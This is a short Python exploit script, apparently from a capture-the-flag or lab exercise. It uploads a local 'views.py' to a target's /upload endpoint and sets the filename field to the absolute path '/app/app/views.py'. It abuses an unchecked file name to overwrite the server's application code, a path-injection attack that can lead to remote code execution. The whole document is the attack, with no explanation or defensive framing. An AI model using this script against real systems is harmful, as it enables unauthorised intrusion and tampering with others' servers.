#!/usr/bin/python3

from requests import post

url = 'http://<target>/upload'
filename = '/app/app/views.py'

files = {'file': (filename, open('views.py', 'rb').read())}
req = post(url, files=files)
print(req.text)
